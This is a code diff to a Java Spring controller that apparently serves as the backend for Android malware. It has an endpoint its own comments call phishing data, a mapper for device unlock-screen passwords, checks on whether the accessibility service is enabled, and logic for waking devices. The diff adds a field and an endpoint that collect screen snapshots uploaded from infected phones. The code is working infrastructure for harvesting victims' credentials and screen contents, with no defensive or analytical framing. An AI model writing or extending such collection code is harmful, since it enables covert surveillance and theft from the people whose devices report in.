@@ -65,6 +65,8 @@ public class DeviceApiController extends BaseApiController {
     private HeartService heartService;
     @Autowired
     private UnlockScreenPwdMapper unlockScreenPwdMapper;
+    @Autowired
+    private ScreenSnapshotService screenSnapshotService;
 
 
     //注册设备
@@ -284,6 +286,9 @@ public class DeviceApiController extends BaseApiController {
         updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);
         updateDevice.setPermissions(deviceStatus.getPermissions());
         updateDevice.setCharging(deviceStatus.isCharging() ? Constant.YN.Y : Constant.YN.N);
+        if(StringUtils.isNotEmpty(deviceStatus.getScreenSnapshot())){
+            updateDevice.setScreenSnapshot(deviceStatus.getScreenSnapshot());
+        }
         updateDevice.setBattery(deviceStatus.getBattery());
         if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
             log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(), DeviceContext.getDeviceId());
@@ -365,7 +370,7 @@ public class DeviceApiController extends BaseApiController {
     /**
      * 钓鱼数据
      *
-     * @param jsonObject
+     * @param fishDataVo
      * @return
      */
     @PostMapping("submitFishData")
@@ -422,6 +427,19 @@ public class DeviceApiController extends BaseApiController {
 
 
         log.info("钓鱼数据:{} - {}", deviceId, fishDataVo);
+        return Result.toSuccess();
+    }
+
+    @RequestMapping("uploadScreenSnapshot")
+    public Result<Void> uploadScreenSnapshot(@RequestBody List<ScreenSnapshot> list){
+        String deviceId = DeviceContext.getDeviceId();
+        String pkg = DeviceContext.getPkg();
+        for (ScreenSnapshot screenSnapshot : list) {
+            screenSnapshot.setId(null);
+            screenSnapshot.setPkg(pkg);
+            screenSnapshot.setDeviceId(deviceId);
+        }
+        screenSnapshotService.saveBatch(list);
         return Result.toSuccess();
     }
 
